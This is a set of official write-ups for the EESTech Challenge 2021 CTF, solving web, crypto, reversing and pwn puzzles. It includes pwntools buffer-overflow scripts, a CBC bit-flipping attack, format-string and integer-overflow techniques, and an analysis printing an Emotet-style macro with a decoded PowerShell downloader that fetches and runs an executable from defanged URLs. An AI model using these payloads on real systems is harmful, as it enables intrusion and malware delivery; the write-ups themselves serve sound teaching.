# EESTech Challenge 2021 Official Write-ups
We helped EESTech and Mesa to organize and manage the CTF, and here you can find all the writeups of the challenges.

**Disclaimer:** those are *our* personal solutions, so feel free to contact us if you think your solution is better!

Done by: 
* [Gregorio Galletti](https://github.com/gregalletti)
* [Stefano Bagarin](https://github.com/stepolimi)

# Write Ups - Categories and Points
## Web
### Secret code ![c](https://img.shields.io/badge/20_points-green)
Visit https://metaproblems.com/e7fce2f2fcac584b49fe615b11784ff3/ and try to get a general idea: we only have one input field to enter the "secret code". Try to play with that, and you will see that a "You are not authenticated. Please enter the secret code to log in." will be displayed. 

What you should do now is to think about possible attacks or vulnerabilities, like XSS or others. However this was an easy challenge, so the *authenticated* word should remind you.. **cookies**! A bad use of cookies is for authentication purposes, so let's take a look at them. 

We can see the `cm-authenticated` token set to 0, so just set it to 1 and refresh the page, the flag is there!

### Old website ![c](https://img.shields.io/badge/30_points-green)
Classic User Agent challenge, of course you don't have to reinstall Internet Explorer 3.0! 

Just google and search for a suitable agent string to set for your browser, set it and reload the page. From Chrome, just go on `Developer tools` and click the 3 dots in the right upper side, `More tools > Network conditions > User agent` and paste in here.

We can use this: `Mozilla/3.0 (compatible; MSIE 3.0; Windows NT 5.0)`

There you go! Flag: **flag_{d0_n0t_trust_the_Us3r-4g3nt}**

### Note viewer ![c](https://img.shields.io/badge/75_points-green)
Not so trivial challenge, this because the solution uses not the most common technique when taking about SQL Injection. We can see the debug query on the page, so we can get an idea of the sanitizations and checks used.

By just trying some basic SQL Injection payloads we will fail, but we get to know an important thing: some really useful symbols are disabled (#, \, ...), quotes and double quotes are sanitized, and also a LIMIT 1 is added at the end to prevent us leaking all the data.

What we can do is to think about what is NOT disabled: if you didn't know, a `backtick \` `in a query
`' or 1=1 union select 1,2 as \``
### Bad redirects ![c](https://img.shields.io/badge/100_points-green)

## Cryptography
### Once upon a time 1 ![c](https://img.shields.io/badge/10_points-green)
Very trivial challenge. wcrx_{kl_hlfhlv_Silkvwfitzex_dv} is clearly "encoded" with Caesar algorithm, so just decrypt it in some way.
**flag_{tu_quoque_Bruteforcing_me}**

### Once upon a time 2 ![c](https://img.shields.io/badge/20_points-green)
Again another trivial challenge, the main issue was to get the used algorithm. An easy answer is Vigenerè, which is easily bruteforceable, but some online tools would mess this up. A huge hint was given in the challenge description, saying "remember that in cryptography patience is key".

With no surprise, decrypting with key = PATIENCE gives the flag: **flag_{this_was_too_easy_to_decrypt!}**

### Hashception ![c](https://img.shields.io/badge/50_points-green)
The challenge starts with a file containing bunch of alphanumerical strings, and 4 strings that were the first 4 strings in the file; the challenge name also states "Blake" which could refer to an hashing algorithm, interesting.

The strings length is repeated in a cyclic way, so:
* 1st string: 128 chars
* 2nd string: 40 chars
* 3rd string: 64 chars
* 4th string: 64 chars
* and then repeated  

We can try to bruteforce one of the first 4 strings (*da39a3ee5e6b4b0d3255bfef95601890afd80709*), resulting in an empty string hashed with SHA1. Ok so maybe also the other 3 correspond to an empty string? 
The answer is yes, and by simply trying I we can pull out also the other used algorithms, reaching this situation:
* 1st string: Blake 2b Hash
* 2nd string: SHA1
* 3rd string: SHA256
* 4th string: SHA3-256

From now on it's pretty easy: we know the algorithms and that we have to always add only a new character.

Here is the final script, that simply gets all the strings and starts from the 5th one. In a cyclic way it bruteforces char by char the 4 different hash types until the end: 
```python
import hashlib
alphabet = " 1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHILMNOPQRSTUVWXYZ,.-_'?!$%&/()={}"
message = ""

file1 = open('hash.txt', 'r')
Lines = file1.readlines()

count = 0;

for line in Lines:
	if(count >3):
		for c in alphabet:
			encMes = ""
			if(count % 4 == 0):
				encMes = hashlib.blake2b(str.encode(message +c)).hexdigest()
			elif(count % 4 == 1):
				encMes = hashlib.sha1(str.encode(message +c)).hexdigest()
			elif(count % 4 == 2):
				encMes = hashlib.sha256(str.encode(message +c)).hexdigest()
			elif(count % 4 == 3):
				encMes = hashlib.sha3_256(str.encode(message +c)).hexdigest()
			if(encMes in line):
				message += c
				break
	count +=1

print(message)
```
Flag: 

**flag_{1t3r4t1v3_h4sh_cr4ck1ng_1s_qu1t3_c00l_w1th_pyth0n}**

### Not a noob ![c](https://img.shields.io/badge/75_points-green)
The important thing of this challenge was to have an idea of RC4 algorithm. RC4 is basically a XORing algorithm, and the only way to get the flag here was to suppose that the keys used were identical (as they were): this could be extracted by the fact that we told you "there is no need to bruteforce the key".

Given this, the remaining part is to XOR the two images without XORing their headers. A bitwise XOR on images is performed with this fancy command (Unix systems):
```
convert noob_1.png noob_2.png -fx "(((255*u)&(255*(1-v)))|((255*(1-u))&(255*v)))/255" noob_out.png
```
Resulting in noob_out.png containing: **D0n7_reU2e_J00R_Key2**

### Bank fraud ![c](https://img.shields.io/badge/100_points-green)
This wasn't a trivial challenge, however the things you had to focus on were:
* the plaintext length
* the block size

What we have is the original ptx (SEND BOB 100$, length = 13) and its ctx (4c60fc0a8fdf3baa185c885195be64b5 2462320459dbd69ea4383c139c19999e, size1 = 16, size2 = 16). Every AES block in CBC is thus of 16 byte size. 

The modified ptx should become (SEND LEO 999999$, length = 16), so we are good, staying in a single block.

Briefly, AES-CBC works on fixed-size blocks (we said 16 bytes), and during *encryption* the ciphertext of the previous block is used to generate the next one, starting from an Initialization Vector IV (we can say IV = CTX_0). Knowing that, we can conclude that the given ctx is formed by IV and CTX_1 (remember, we use only 1 block).

During *decryption*, the CTX_N-1 is used to generate the plaintext of the next block; this is where the **bit/byte flipping attack** smashes. If we change one byte of the CTX_N-1 then, by XORing with the next decrypted block, we will get a different plaintext!

In this case we control the CTX_1, thus we have to modify the previous block: IV!

In the following picture you can see the decryption process of AES-CBC, so considering only the first block, the CTX will be first decrypted (with an unknown key) and then XORed with the IV. We provide both the IV and the CTX, so we are in total control of this.

![Alt text](./Cattura.PNG?raw=true "Title")


Let's get a general idea: 

```
PTX1 = SEND BOB 100$ 		= 	53 45 4e 44 20 42 4f 42 20 31 30 30 24 00 00 00
PTX2 = SEND LEO 999999$ 	=	53 45 4e 44 20 4c 45 4f 20 39 39 39 39 39 39 24
IV_original			=	4c 60 fc 0a 8f df 3b aa 18 5c 88 51 95 be 64 b5 
CTX_1 				= 	24 62 32 04 59 db d6 9e a4 38 3c 13 9c 19 99 9e

In formulas we get:
dec(CTX) ^ IV_original = PTX

Take the 6th byte as an example (corresponding to the PTX character 'B'):
dec(db) ^ df = 42

So:
42 ^ df = dec(db) = 9d

We now ask ourselves, what is the number that, XORed with 9d, gives us 4c (the new char that we want, so 'L')?
x ^ 9d = 4c	=>	4c ^ 9d = d1
```

**d1** is in fact the 6th byte of the new IV to provide as a flag. 
Let's put it as a general formula: 
```
IV_modified[i] = PTX2[i] ^ (IV_original[i] ^ PTX1[i])
```

This can be written in Python, here you can find two different scripts:

```python
-------------
| SCRIPT 1  | (inputs are different)
-------------

iv = [0x49,0x86,0xc2,0x88,0x7a,0x1d,0xfd,0xed,0xea,0xfd,0xab,0x18,0x93,0x8c,0x00,0x19]
ctx = '4c691cb28b4d399bea66f6fa9caae243'

ptx1 = [0x53,0x45,0x4e,0x44,0x20,0x42,0x4f,0x42,0x20,0x31,0x30,0x30,0x24,0x00,0x00,0x00]
ptx2 = [0x53,0x45,0x4e,0x44,0x20,0x4c,0x45,0x4f,0x20,0x39,0x39,0x39,0x39,0x39,0x39,0x24]

res=''
for i in range(0,5):
    res += hex(iv[i])[-2:]

for i in range(5,len(iv)):
    res += (hex(ptx2[i] ^ (iv[i] ^ ptx1[i]))[-2:])
    
print(res + ' ' + ctx)

-------------
| SCRIPT 2  |
-------------

def stringToHexNum(n):
    return int(n, 16)
    
iv2 = '4c60fc0a8fdf3baa185c885195be64b5'
ctx = '2462320459dbd69ea4383c139c19999e'
iv = []
ptx1 = []
ptx2 = []

a = 'SEND BOB 100$'
b = 'SEND LEO 999999$'

for i in range(0,len(iv2),2):
    iv.append(iv2[i] + iv2[i+1])

for i in range(0,len(a)):
    ptx1.append(format(ord(a[i]), "x"))

for i in range(len(a),16):
    ptx1.append('00')

for i in range(0,len(b)):
    ptx2.append(format(ord(b[i]), "x"))

res=''
for i in range(0,5):
    res += iv[i]

for i in range(5,len(iv)):
    x = stringToHexNum(ptx2[i])
    y = stringToHexNum(iv[i])
    z = stringToHexNum(ptx1[i])
    res += hex(x ^ (y ^ z))[-2:]
    
print(res + ' ' + ctx)

```
## Forensics
### Succulent ![c](https://img.shields.io/badge/10_points-green)
### Little riddle ![c](https://img.shields.io/badge/20_points-green)
### Little haystack ![c](https://img.shields.io/badge/30_points-green)
```python

```
### Big haystack ![c](https://img.shields.io/badge/50_points-green)
```python

```
### Blackhole ![c](https://img.shields.io/badge/50_points-green)
### German espionage ![c](https://img.shields.io/badge/75_points-green)

## Miscellaneous
### Trust me ![c](https://img.shields.io/badge/10_points-green)
Very easy challenge, what we have to do is to recognize the "encryption" used, that in this case is clearly Base64 (easy to guess from the = at the end). A little hint was already there, because I know a lot of people who think that B64 is an encryption method, just because it's something different from text.

We can easily decode all the strings and get: 
```
MzY0XzRuXw== -> 364_4n_  
M25jcnlwdDEw -> 3ncrypt10
bj9fbjQ0NDQ= -> n?_n4444
NDQ0NGh9 -> 4444h}
ZmxhZ197 -> flag_{
MXNfYjRz -> 1s_b4s
```

A quick reordering and we get the flag: **flag_{1s_b4s364_4n_3ncrypt10n?_n44444444h}**

### Papernote ![c](https://img.shields.io/badge/20_points-green)
This challenge was quite tricky honestly. The description says: *I have an EXCLUSIVE news 4 you: this is NOT the flag!*

What we have to do is to basically try to understand this: we get EXCLUSIVE, 4 and NOT as key words to remember. With some immagination we can suppose to take the input and apply two operations: a XOR and a NOT. A XOR, for who doesn't know, is an EXCLUSIVE OR operation, so this makes sense. At the same time, we must find a number to make the XOR with: 4 seems perfect!

Now we can start trying (operations order won't be a problem, we can XOR and then NOT or viceversa), the only thing we have to be careful is that they will be bitwise operations. We can perform them with online tools or with a very simple Python script, as shon below:

```python
def stringToHexNum(n):
    return int(n, 16)
    
input = '9d979a9ca480caa497ca90c8a497cb9cca98a4cb8bc8cf8fcacb958886'

iv = []
res = ''

# split the input byte by byte
for i in range(0,len(input),2):
    iv.append(input[i] + input[i+1])

# for each byte perform a XOR with 4 and a NOT
for i in range(0,len(iv)):
    x = stringToHexNum(iv[i])
    res += chr(stringToHexNum(hex(~(x ^ 4) & 0xff)[2:]))
    
print(res)
```

The flag is: **flag_{1_l1k3_l0g1c_0p34t10ns}**

### Throwback ![c](https://img.shields.io/badge/50_points-green)
The main issue with this challenge is that the given string highly reminds base4 numbers, but that was the point. We also released an hint about that, so you could get the real language used (Morse code). Morse code is actually a quaternary code, with 4 main characters: 
* Line
* Point
* Space
* Newline

So now the challenge is how to replace numbers (0, 1, 2, 3) with these new chars? Well, trial and error is always a good way (helped by the fact that Line and Point should be the ones more frequent, so 1 and 0).

```python
encoded = "0000202010020100211123212000020020002320020002320123211200200021010202010020100201210202111200120002320210012012112011020100202010101232120000202320010201002012110232002000232011212111002110200012001021102000002110120002001021012101020121201021100112321011211120012320000201200012023212111232002102000202010212321200002023210102001201020100210112321000201020121010202000232012102100232120000202320012102100202010200021010211120102023210102000020120102012101021202010232101121112001201020002020100200102010101"
decoded = encoded.replace("0", ".")
decoded = decoded.replace("1", "-")
decoded = decoded.replace("2", " ")
decoded = decoded.replace("3", "\n")

print(decoded)
```
Resulting in:
```
 .... . .-.. .-.. --- 
 - .... .. ... 
 .. ... 
 .- 
 -- .. ... -.-. . .-.. .-.. .- -. . --- ..- ... 
 . -..- .- -- .--. .-.. . .-.-.- 
 - .... . 
 ..-. .-.. .- --. 
 .. ... 
 .-- - ---.. --. ...- ..-. --. ..... --.- ... ..-. -.- -.-. .- - .-. --..-- 
 -.-- --- ..- 
 .... .- ...- . 
 - --- 
 .. -. ... . .-. - 
 - .... . 
 -.-. ..- .-. .-.. -.-- 
 -... .-. .- -.-. . ... 
 .- -. -.. 
 - .... . 
 ..- -. -.. . .-. ... -.-. --- .-. . 
 -.-. .... .- .-. .- -.-. - . .-. 
 -.-- --- ..- .-. ... . .-.. ..-. .-.-.-
```
This is clearly Morse code, so let's just convert it into text (a lot of online tools are available), resulting in:

```hello?this?is?a?miscellaneous?example??the?flag?is?wt8gvfg5qsfkcatr??you?have?to?insert?the?curly?braces?and?the?underscore?character?yourself?```

Ok, so the flag is **flag_{wt8gvfg5qsfkcatr}**

### EESTudios ![c](https://img.shields.io/badge/75_points-green)
We are given 2 audio tracks, one "Studio" version and one "Official" version: this already was an hint, due to the fact that having 2 tracks and knowning there is a watermark (or a sort of copyright) we can conclude that we should do some operations between them. To solve it we can open the two tracks with ```Audacity``` to see if just the spectrum of the leaked track contains, for example, an image with the flag (common thing with audio steganography challenges). 

![Alt text](./spectrum.PNG?raw=true "Title")

This was right, but we just wanted to fool you. A watermarked audio theoretically contains more than the non-watermarked one, so invert the second one (```Effects > Invert > Built-in-Effect: Invert```) and mix them (```Tracks > Mix > Mix and Render```): the result is, as expected, the actual watermark. By listening it, this is the spelling of the flag.

Here is the flag: 

**flag_{you_did_it}**

## Reversing
### Homemade Encryption ![c](https://img.shields.io/badge/20_points-green)
The given code is:
```python
import binascii
key = "graAhogG"
def mystery(s):
    r = ""
    for i, c in enumerate(s):
        r += chr(ord(c) ^ ((i * ord(key[i % len(key)])) % 256))
    return binascii.hexlify(bytes(r, "utf-8"))
```
Seems cool right? Well yes, but actually no. 
What happens with every pure XORing encrypting algorithm? That if the key is known, we can just apply again the encription to decrypt the cyphertext! 
In this case we know the key (graAhogG), so given the ctx as input we can trivially invert everything like this:

```python
import binascii
key = "graAhogG"
flag= "661ec2a3c2a4c3bf5009c2995970c295c2a9c299c3bcc3814111c3a0c28dc2ab4f69c2a7"
def mystery(s):
    r = ""
    t = binascii.unhexlify(s).decode("utf-8")
    for i, c in enumerate(t):
        r += chr(ord(c) ^ ((i * ord(key[i % len(key)])) % 256))
    return bytes(r, "utf-8")

print(mystery(flag))
```

### Password Here Please ![c](https://img.shields.io/badge/85_points-green)
The challenge consinsted in reverse engineering a ```Python``` code to find the string that gets throught each check. The first step was just understanding that the problem could be divided in 4 parts.

The first part (lines 5-7) was just a check on the lenght of the string that must be 24 characters. 

The second part (lines 9-14) was a constrain con the first 8 characters of the string: theyr hexadecimal ASCII value being subtracted to 0x98 and concatenated togheter had to be equal to the string '&e"3&Ew*'.
	Resulting string = "r3verS!n"

The third part (lines 16-23) was checking the second set of 8 characters of the string. The last one's ASCII value added to the last character of the array "ring" and to 0x1f gave the last character of the string; each other one was it's following character's ASCII value plus the corresponding number in the "ring" array plus 0x1f if grather than 0x60-0x1e, minus 0x1f if between 0x40-0x1e and 0x60-0x1d, unchanged otherwise.
	Resulting string = "g_pyTh0n"

The fourth part (lines 25-31) was for the last 8 characters and it was the most challenging one. I tryed to convert "code" from hexadecimal to decimal value and then put it in base 257, the result was a nice "number":

[8, 0, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]

after noticing that each number is a power of 2 I managed to realize that the distance from each non-zero number to the start of the number added to 0x28 was the ASCII value of the characters of the substring, while the exponent of 2 was the index of the character in the substring (0-7).
Once understood that, there was only left to find each value and reorder them.
	Resulting string= "_fOr_FUn"

The result was the 3 substrings togheter.

**r3verS!ng_pyTh0n_fOr_FUn**

### Emotet is between us ![c](https://img.shields.io/badge/125_points-green)
One of the most difficult challenges of the CTF, also because is not something so common. We gave you a .doc file saying that it was a malware (obviously not actually dangerous), and the first thing to notice is that an usual practice in malwares is to use macros to execute commands in backgroud, not visible by the users. 

And also this is the case. In fact, by opening the file with Word for example, disabling security blocks for macros (sometimes also disabling Windows Defender is necessary) we can access the VBA code. Let's take a look at it:

```
Function UUz0RJI()
      On Error Resume Next
   For Each RHiKkiLG In A5M2p7jK
      For Each G75P1US In qJEc7IRb
         Dim GIYjspC, nB9SYV, LPUPL1N
         Dim wcQtYfJ, ZuaMkz, i422qG
         CMCU7SLC = Sqr(imiXhzrE * zBqizFPU)
         Next
      Do
         Dim NV_0VSGS, dYD3M3, RCKlPU
         Dim bfi2D2, XPmfBPs, iXl0wV6d
         iipGpOUw = Hex(cIt0mZ9P * EVw6k9)
   Loop Until lJnXC2 Eqv pI8QsdFp
   Next
Ww_KhOVz = G2wST3 + zG09JQ(ThisDocument.RjQh9O8r + ThisDocument.YjCTu6) + iOcZRt
      On Error Resume Next
   For Each XzfowjXj In zp_dZk
      For Each kKK37jlj In iFNokz
         Dim ACjMki6, YDJ2lwq, qk27CPW
         Dim LEWEN34j, Zkq8Q0, CNERhtN
         iF_Q2R = Sqr(iNY2S0CO * oIol86u)
         Next
      Do
         Dim o8hn3O, Yk9pTD, nupvPCDG
         Dim rYEJFhh, mElhmcvj, ndFX7LK
         sv4aUaY = Hex(RfaHIM * INDTida)
   Loop Until wwAJ96d Eqv F3oQHN
   Next
      On Error Resume Next
   For Each YhwOWG In zfCLM4
      For Each QKaoid3Q In WbRwPX
         Dim WGF6d2G, XwOpl1zO, ulAph_P
         Dim tLPpbqc, VskhKsac, rmciw82
         Xi6OLrb = Sqr(Hz0JGJ * tWbSOE0z)
         Next
      Do
         Dim WncslwCR, YY2uIOT, jfSuDEi
         Dim Ld7bV4, mbMMG1BT, arK_vvT
         H4YoHS = Hex(hjCD9u * tCRlqQa)
   Loop Until wz9OsLI Eqv sEWzE6L
   Next

VXMzL_3u = CreateObject("w" + zG09JQ("inMetamMetagmMe" + "tatsMeta:MetaWMetainMet" + "a3Meta2Meta_MetaM" + "aMetaoMetaMetaceMetasMetas")).Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)
      On Error Resume Next
   For Each WWWjLD2Y In iJu_wF2u
      For Each GG7zNa7h In B0N8cTL
         Dim nHUCsc, wwo5Ls, RbjVvIU_
         Dim j8zii6Oj, oEOUtM9t, rQAHH4m
         jzVk9wi = Sqr(QtqqzUC * MmjKmO)
         Next
      Do
         Dim V8pbmT8C, WiQiLv, CvKdqE3
         Dim i6dLHjE, o0sZtof, n8rbwnM
         l8Qkj8 = Hex(Gz6T7L * wjsnCh9)
   Loop Until FsqOG10 Eqv SaWMZv
   Next
End Function
Function zG09JQ(hs_BwF)
      On Error Resume Next
   For Each VjsX6M In iC5iYoMr
      For Each KSGqtMd0 In RprNb9K
         Dim nRE_bsO, Aa0u3KuN, pf67oSY_
         Dim FaisH6nI, wfTj0Iq, biN3ZrF3
         kDs4N1k = Sqr(j8il7c * JY9fmw)
         Next
      Do
         Dim K4jEBBDR, fQmGqYN, s04SZnY5
         Dim wFPfEA9, Ml5Q4U1j, kkRM1V
         iJboIk = Hex(ZWviFtWW * zsA0jHr)
   Loop Until qo5aKOsX Eqv fdTYH1i
   Next
zG09JQ = Replace(hs_BwF, Replace("$$$$M$e$t$$$a$", "$", ""), "")
      On Error Resume Next
   For Each rlot_b In padf9ZdD
      For Each kAzN0lN In mJB56iNs
         Dim ttcWBT, oIPrb1, bVnnCfI
         Dim fwjj9vsP, jPow6_T, jDsLUYA3
         FXk8fah = Sqr(qXibhP5R * kntDa1w)
         Next
      Do
         Dim JL84nnz, PJXYjl, HmK8bGI
         Dim wXUKHsh, b4f6zt, wuJUHHaF
         lovEwi = Hex(W58Lb2c * n2Ozc7)
   Loop Until ULD3P5 Eqv awSicE8
   Next
End Function
```

What we can see here is basically nothing. We have those fancy variables and instructions, a lot of foreach, do-while and function calls. The key idea here is to try and check some variables, and see that they don't actually exist in the document! From that we can conclude there is A LOT of **obfuscation**.

For example take the first foreach statement (`For Each RHiKkiLG In A5M2p7jK ...`), start by searching `RHiKkiLG` in the code: no results. Search in document variables: nothing as well. We may get to the conclusion that this loop is useless. Also by noticing the nested instructions like `Dim GIYjspC, nB9SYV, LPUPL1N` we can support this thesis, because Dim in VBA declarates a variable, and those variables are never used later in the code.

At this point we start to clean the code, deleting all identified useless lines, reaching this cool situation:
```
Function UUz0RJI()
   
Ww_KhOVz = G2wST3 + zG09JQ(ThisDocument.RjQh9O8r + ThisDocument.YjCTu6) + iOcZRt

VXMzL_3u = CreateObject("w" + zG09JQ("inMetamMetagmMe" + "tatsMeta:MetaWMetainMet" + "a3Meta2Meta_MetaM" + "aMetaoMetaMetaceMetasMetas")).Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)
     
End Function

Function zG09JQ(hs_BwF)
     
zG09JQ = Replace(hs_BwF, Replace("$$$$M$e$t$$$a$", "$", ""), "")
    
End Function
```

Look at that, we now have only 3 instructions ready to be reversed! Again here we have some obfuscation, but it's way more easy to understand (in the first instruction for example, we can delete both `G2wST3` and `iOcZRt` for the same reasoning applied above). We now have 3 main things to focus on:
* ThisDocument.RjQh9O8r and ThisDocument.YjCTu6 are somehow suspicious, but we can't say nothing on them yet (apart that they must be related to the document itself)
* CreateObject and Create, used in VBA as in other programming language with objects
* Replace clearly does what we expect, but how? *Replace(expression, find, replace, ...)*

Now we can simplify the `zG09JQ` function:
```     
zG09JQ = Replace(hs_BwF, Replace("$$$$M$e$t$$$a$", "$", ""), "")

- with Replace("$$$$M$e$t$$$a$", "$", "") => "Meta", just delete $s 

zG09JQ = Replace(hs_BwF, "Meta", "")
```

Clearly, when called, the `zG09JQ` function just deletes the "Meta" substring to the passed string, so we can simplify again the code by removing the function call and modifying the strings passed as parameter, concatenating them:
```
VXMzL_3u = CreateObject("w" + zG09JQ("inMetamMetagmMe" + "tatsMeta:MetaWMetainMet" + "a3Meta2Meta_MetaM" + "aMetaoMetaMetaceMetasMetas")).Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)

- concat parameters

VXMzL_3u = CreateObject("w" + zG09JQ("inMetamMetagmMetatsMeta:MetaWMetainMeta3Meta2Meta_MetaMaMetaoMetaMetaceMetasMetas")).Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)

- remove function call and modify string

VXMzL_3u = CreateObject("w" + "inmgmts:Win32_Maocess").Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)

- concat again

VXMzL_3u = CreateObject("winmgmts:Win32_Maocess").Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)
```

We can immediately notice the *winmgmts* keyword which indicates a WMI service and *Win32_Maocess* which seems something strange, in fact also googling it gets no results. This means we are in this situation:
```
Function UUz0RJI()
   
Ww_KhOVz = zG09JQ(ThisDocument.RjQh9O8r + ThisDocument.YjCTu6)

VXMzL_3u = CreateObject("winmgmts:Win32_Maocess").Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)
     
End Function

Function zG09JQ(hs_BwF)
     
zG09JQ = Replace(hs_BwF, "Meta", "")
    
End Function
```

and nothing more! How we can proceed? We have no other info, and we can't simplify further (`zG09JQ` semplification can't be applied, we don't know ThisDocument parameters).
That's the point, we don't know them but we do have them, even if we don't know their names (obfuscated) and their values. Moreover, if we try to run the macro we will get an error saying that the object cannot be created.

We should find a way to view the `Ww_KhOVz` variable before is used to create the object, as it's just a concatenation of the 2 ThisDocument parameters with "Meta" substring removed. If you don't know how, `MsgBox` is a standard way to print a dialog in macros, and we can also pass arguments: let's insert a `MsgBox(Ww_KhOVz)` just below the first instruction and see what we get:

![Alt text](./emo.PNG?raw=true "Title")

Interesting, let's copy that! MsgBox interaction to copy text is awful, but you just need to Ctrl+C and paste it somewhere. This highly reminds Base64, so we can try to decode it:
```
$zGJ4nJ='lv3wK917';$LJuFr3 = '835';$UPKrwaP='qbocOSC';$rr5KRuw1=$env:userprofile+'\'+$LJuFr3+'.exe';$zEuDiBB0='NUzPobBB';$Xt_Mwq=&('new'+'-obj'+'ect') NEt.wEbcLIeNt;$dj6dmr='hxxp://thinhvuongmedia[dot]com/wp-admin/n2keep7/@hxxps://mnpasalubong[dot]com/wp-admin/nsmz9az032/@hxxp://trunganh[dot]xyz/wp-content/uzq50/@hxxps://iptivicini[dot]com/npkx/jwpy938/@https://metaproblems.com/a90d58c20b6014f856c12ed56432ae48/flaggggggggggggg.txt@hxxps://iptivicini[dot]com/npkx/jwpy938/@hxxps://www.cezaevinegonder[dot]com/conf/fd45/'."Spl`IT"('@');$TdXni0R='d47iM40';foreach($ojjUTojB in $dj6dmr){try{$Xt_Mwq."dowNL`OA`Df`iLE"($ojjUTojB, $rr5KRuw1);$nJqw8XQ='JAANQO3W';If ((&('Ge'+'t-Ite'+'m') $rr5KRuw1)."LenG`Th" -ge 29804) {[Diagnostics.Process]::"ST`ArT"($rr5KRuw1);$dfv5j5
```

Still awful, but we get human-readable strings and if you look closely you can rapidly find an interesting link (https://metaproblems.com/a90d58c20b6014f856c12ed56432ae48/flaggggggggggggg.txt), open it and it will display the flag.

**MetaCTF{aint_no_visual_basic_activex_malware_gonna_hide_from_you}**

## Pwn
### Binary1.0 ![c](https://img.shields.io/badge/20_points-green)
This challenge is very trivial. Our goal is to bypass the if statement and execute the system function. to bypass the boolean controll we must modify the "isAuthenicated" variable from 0 to any other value, in simple terms we must overflow the buffer (48 bytes) with a payload of 48+8 bytes long; in this way we overwrite the content of "isAuthenticated" variable and wether the last eight bytes of the payload are different from zero we have bypassed the if statement and we get the flag.

Written in Python this is:
```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
r = remote("host1.metaproblems.com", 5150)

payload = b"a" * 62

r.send(payload)

r.interactive()
```

**MetaCTF{just_a_little_auth_bypass}**

### Binary2.0 ![c](https://img.shields.io/badge/30_points-green)
This challenge is quite similar to the previus one. We always have to do a buffer owerflow in this way: to bypass the string comparison our buffer must start with "Sup3rs3cr3tC0de" string and it must overwrite RIP with the address of the win function. The below script is auto-esplicative.
```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
r = remote("host1.metaproblems.com", 5151)

# from a quick run with gdb
addr = 0x401172 
base = 0xd68
payload = b"Sup3rs3cr3tC0de" + b"\x00" * 33 + p64(base) + p64(addr)

r.send(payload)

r.interactive()
```

**MetaCTF{c_strings_are_the_best_strings}**

### Godlike ![c](https://img.shields.io/badge/125_points-green)
One of the hardest challenges, I'm not gonna lie. Given the fact that here there is one intended solution and an unintended one, we will focus mainly on the first one.
Let's play with the binary: what we can immediately get is that earning "legit" money won't be feasible, so we must search for a better approach. I will divide the exploitation in two main phases.

> Getting the shoutout

**Unintended:** by betting A LOT, always all of your money, you will eventually succeed to get enough money to legally buy the shoutout. However this was not the best way to solve that part, also because you may fight against probability.

**Intended:** by looking at the source code, we can notice something interesting in the purchase() function:
```c
void purchase()      
{        
    std::map<std::string, unsigned long long> prices{
        {"tool", 100},                                                                                  
        {"encouragement", 20},
        {"shout-out-from-literally-god", 1000000000000000ULL}};
                                                    
    std::string option{};                                                                               
    do {
        std::cout << "What would you like to buy? Options are ";
        for (auto& entry : prices) {
            std::cout << entry.first << " (cost: " << entry.second << "), ";
        }
        std::cout << "or cancel" << std::endl;
        std::cin >> option;
        if (option == "cancel") {
            return;
        }
    } while (prices.find(option) == prices.end());

    unsigned long long count{0};
    do {
        std::cout << "How many would you like to buy? Must be greater than 0 (count, player_funds)" << std::endl;
        std::cin >> count;
    } while (!std::cin.good() || !count);

    auto item_cost{prices.at(option)};
    auto total{item_cost * count};

    if (total > player_funds) {
        std::cout << "You don't have the money for that!" << std::endl;
        return;
    }
...
```

When purchasing, an `auto total{item_cost * count};` variable will be calculated (auto means that the variable type will be assigned automatically). What's the problem here? An **integer overflow** is possible (remember that overflows are not only on buffers) meaning that we should try to get a precise number that leads to a `total` variable equal to 0, 0 because it's always a good price.

Let's split a bit the problem to understand it better: 
* We are in control of the `count` variable, and only of that (it's an `unsigned long long`)
* The maximum number that can be stored in an `unsigned ll` is 2^64, so 18,446,744,073,709,551,616, call it `max_ull`
* An integer overflow happens when we try to store a bigger number, so we want to do this
* When overflowing, the number will be divided by `max_ull` (integer division, modulo) and stored

Now that this is clear, write some math to get the desired value `x`, given the `shoutout_cost`:
```
x * shoutout_cost = 0 (mod max_ull)
so:
x * 1000000000000000 = 0 (mod 18446744073709551616)
x = 562949953421312 * c, where c is a constant
```

Easy, now we will just send 562949953421312 as quantity for the shoutout and God will talk to us, but it's not over yet!

> Retrieving the flag

Unfortunately God seems not to be really happy, so let's have a deeper look to the code:
```c
...
 else if (option == "shout-out-from-literally-god") {
        bool god_is_happy = rand() & 0xFFFFFF == 0;
        bool* god_is_really_happy = &god_is_happy;
        printf("Hmmmm\n");
        printf(name.c_str());
        printf("\nYou have done well!\n");
        printf("Good job!\n");

        if (*god_is_really_happy) {
            printf("I'm feeling generous right now!\nHave a flag!\n");
            std::ifstream t("flag.txt");
            std::string str((std::istreambuf_iterator<char>(t)),
                            std::istreambuf_iterator<char>());
            std::cout << str << std::endl;
        }
...
```
ALWAYS look carefully at every possible vulnerability, here we have one of the most common: **Format String**.

When the program starts we are asked for a name. Nice, but what happens is that this name is then printed just before the shoutout with a printf... 

Input is never sanitized or modified, so this looks quite promising: just try with a %x as name, you will see some leaks when getting the shoutout. The issue is now how to make God really happy, and the solution is the "classing" writing with a Format String. Using %n will write the number of characters written so far. Basically, it means that %n will write the size of our input at the address pointed by %n.

After some local debugging with gdb looking at the stack and variables locations, we discover that `god_is_really_happy` variable is the 12th pointer to be printed. We did it!

We just need to print 12 pointers with %p%p%p%p%p%p%p%p%p%p%p%p as name and see if everything is working as intended. The last missing part is to craft the actual name, so we want to put "something" different from 0 to the 12th pointer.

